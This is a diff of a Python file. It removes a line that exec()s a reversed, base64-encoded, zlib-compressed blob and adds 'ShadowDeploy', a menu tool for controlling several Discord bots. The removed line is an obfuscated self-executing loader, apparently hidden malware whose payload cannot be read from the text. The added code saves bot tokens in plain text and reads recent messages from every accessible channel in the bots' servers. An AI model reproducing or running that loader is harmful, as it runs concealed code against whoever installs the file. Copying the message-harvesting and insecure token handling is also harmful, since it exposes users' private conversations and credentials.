@@ -1,2 +1,190 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import os
+import sys
+import time
+import threading
+import asyncio
+import discord
+from discord.ext import commands
+import requests
 
+class Colors:
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
+    UNDERLINE = "\033[4m"
+    MAGENTA = "\033[35m"
+    CYAN = "\033[36m"
+    GREEN = "\033[32m"
+    YELLOW = "\033[33m"
+    RED = "\033[31m"
+    LIGHT_GRAY = "\033[90m"
+    WHITE = "\033[37m"
+
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+def print_colored(text, color=Colors.WHITE, bold=False, underline=False, big=False):
+    style = ""
+    if big or bold:
+        style += Colors.BOLD
+    if underline:
+        style += Colors.UNDERLINE
+    print(f"{style}{color}{text.upper() if big else text}{Colors.RESET}")
+
+clear()
+print_colored("========== ShadowDeploy by LK-GONNA11 ==========", Colors.MAGENTA, bold=True, big=True)
+print_colored("Enable PRIVILEGED INTENTS on the Discord Developer Portal:", Colors.YELLOW)
+print_colored("1. https://discord.com/developers/applications", Colors.CYAN)
+print_colored("2. Select your bot", Colors.CYAN)
+print_colored("3. Go to the 'Bot' tab", Colors.CYAN)
+print_colored("4. Enable: PRESENCE INTENT + SERVER MEMBERS INTENT", Colors.CYAN)
+input(f"\n{Colors.YELLOW}Press Enter when done...{Colors.RESET}")
+
+class BotController:
+    def __init__(self, token, name):
+        self.token = token
+        self.name = name
+        self.bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
+        self.loop = asyncio.new_event_loop()
+        self.thread = threading.Thread(target=self.run_bot)
+        self.guilds = []
+        self.channels = {}
+        self.thread.start()
+
+        @self.bot.event
+        async def on_ready():
+            self.guilds = self.bot.guilds
+            print_colored(f"Bot '{self.name}' is now connected!", Colors.GREEN, bold=True)
+            max_display = 10
+            for i, guild in enumerate(self.guilds[:max_display]):
+                print_colored(f"- {guild.name} (ID: {guild.id})", Colors.CYAN)
+                self.channels[guild.id] = guild.text_channels
+            if len(self.guilds) > max_display:
+                print_colored(f"...and {len(self.guilds) - max_display} more servers not shown", Colors.YELLOW)
+
+    def run_bot(self):
+        asyncio.set_event_loop(self.loop)
+        try:
+            self.loop.run_until_complete(self.bot.start(self.token))
+        except Exception as e:
+            print_colored(f"[{self.name}] Connection Error: {e}", Colors.RED)
+
+    def send_message_safe(self, channel_id, message):
+        asyncio.run_coroutine_threadsafe(self.bot.get_channel(int(channel_id)).send(message), self.bot.loop)
+
+    def get_guild_names_and_ids(self, limit=100):
+        return [(g.name, g.id) for g in self.guilds[:limit]]
+
+    def get_channel_names_and_ids_for_guild(self, guild_id):
+        return [(c.name, c.id) for c in self.channels.get(guild_id, [])]
+
+    def fetch_logs(self, guild_id, limit=3):
+        logs = []
+        for channel in self.channels.get(guild_id, []):
+            if channel.permissions_for(channel.guild.me).read_message_history:
+                try:
+                    messages = asyncio.run_coroutine_threadsafe(channel.history(limit=limit).flatten(), self.bot.loop).result()
+                    for m in messages:
+                        logs.append(f"[{channel.name}] {m.author}: {m.content}")
+                except:
+                    continue
+        return logs
+
+def send_webhook_alert(webhook_url):
+    payload = {
+        "username": "ShadowDeploy",
+        "content": "**ShadowDeploy by LK-GONNA11** has successfully connected."
+    }
+    try:
+        requests.post(webhook_url, json=payload)
+    except Exception as e:
+        print_colored(f"Webhook error: {e}", Colors.RED)
+
+def interface():
+    clear()
+    print_colored("========== ShadowDeploy MultiTool ==========", Colors.MAGENTA, bold=True, big=True)
+    webhook = input(f"{Colors.YELLOW}Enter webhook URL for alerts (or leave blank): {Colors.RESET}")
+    if webhook:
+        send_webhook_alert(webhook)
+
+    while True:
+        try:
+            n = int(input(f"{Colors.YELLOW}How many bots to load? (min: 1): {Colors.RESET}"))
+            if n >= 1:
+                break
+        except:
+            print_colored("Invalid number. Try again.", Colors.RED)
+
+    bots = []
+    for i in range(n):
+        token = input(f"{Colors.YELLOW}Bot Token {i+1}: {Colors.RESET}")
+        name = input(f"{Colors.YELLOW}Bot Name {i+1}: {Colors.RESET}")
+        with open("tokens.txt", "a") as f:
+            f.write(f"{token}|{name}\n")
+        bots.append(BotController(token, name))
+
+    while True:
+        clear()
+        print_colored("========== Control Panel ==========", Colors.MAGENTA, bold=True, big=True)
+        print_colored("Select a bot to manage:", Colors.GREEN)
+        for i, bot in enumerate(bots):
+            print_colored(f"{i+1}. {bot.name}", Colors.CYAN)
+        print_colored("0. Exit", Colors.RED)
+
+        try:
+            choice = int(input("Your choice: "))
+            if choice == 0:
+                print_colored("Goodbye!", Colors.GREEN)
+                sys.exit()
+            elif 1 <= choice <= len(bots):
+                sub_menu(bots[choice - 1])
+        except:
+            print_colored("Invalid input. Try again.", Colors.RED)
+            time.sleep(1)
+
+def sub_menu(bot):
+    while True:
+        clear()
+        print_colored(f"========== {bot.name} - Menu ==========", Colors.MAGENTA, bold=True, big=True)
+        print_colored("1. Send Message", Colors.CYAN)
+        print_colored("2. View Logs", Colors.CYAN)
+        print_colored("0. Back", Colors.YELLOW)
+
+        try:
+            action = int(input("Action: "))
+            if action == 0:
+                break
+            elif action == 1:
+                servers = bot.get_guild_names_and_ids()
+                for i, (name, gid) in enumerate(servers):
+                    print_colored(f"{i+1}. {name} (ID: {gid})", Colors.CYAN)
+                sidx = int(input("Server #: ")) - 1
+                if 0 <= sidx < len(servers):
+                    channels = bot.get_channel_names_and_ids_for_guild(servers[sidx][1])
+                    for i, (cname, cid) in enumerate(channels):
+                        print_colored(f"{i+1}. {cname} (ID: {cid})", Colors.CYAN)
+                    cidx = int(input("Channel #: ")) - 1
+                    if 0 <= cidx < len(channels):
+                        msg = input("Message to send: ")
+                        bot.send_message_safe(channels[cidx][1], msg)
+                        print_colored("Message sent successfully!", Colors.GREEN)
+                input("Press Enter to continue...")
+            elif action == 2:
+                servers = bot.get_guild_names_and_ids()
+                for i, (name, gid) in enumerate(servers):
+                    print_colored(f"{i+1}. {name} (ID: {gid})", Colors.CYAN)
+                sidx = int(input("Server #: ")) - 1
+                if 0 <= sidx < len(servers):
+                    logs = bot.fetch_logs(servers[sidx][1])
+                    print_colored("=== RECENT LOGS ===", Colors.YELLOW, bold=True)
+                    if logs:
+                        for log in logs:
+                            print_colored(log, Colors.LIGHT_GRAY)
+                    else:
+                        print_colored("No logs available or permission denied.", Colors.RED)
+                input("\nPress Enter to return...")
+        except:
+            print_colored("Error. Returning to menu...", Colors.RED)
+            time.sleep(1)
+
+if __name__ == "__main__":
+    interface()
